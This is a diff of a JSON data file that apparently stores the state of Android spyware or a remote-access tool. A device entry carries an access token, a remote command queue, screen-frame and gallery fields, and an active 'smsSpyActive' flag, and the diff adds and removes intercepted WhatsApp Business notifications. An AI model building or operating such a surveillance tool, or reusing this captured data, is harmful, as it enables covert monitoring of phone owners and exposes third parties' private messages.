@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632632191,
+    "lastSeen": 1775632633192,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
+        "content": "~ sfr: 🗿",
+        "time": "08/04 14:17",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632634688
+      },
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
+        "content": "~ sfr: 🗿",
+        "time": "08/04 14:17",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632634615
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4310,22 +4326,6 @@
         "time": "08/04 13:48",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775630883909
-      },
-      {
-        "appName": "WA Business",
-        "sender": "JB || KHAFA X NAZRIEL",
-        "content": "~ [𝐂𝐄𝐎 𝐂𝐇𝐈𝐓𝐄𝐑]🔰: Menyebut grup Anda secara privat di status",
-        "time": "08/04 13:46",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630798735
-      },
-      {
-        "appName": "WA Business",
-        "sender": "JB || KHAFA X NAZRIEL: ~ [𝐂𝐄𝐎 𝐂𝐇𝐈𝐓𝐄𝐑]🔰",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "08/04 13:46",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630798706
       }
     ],
     "galleryPhotos": [],
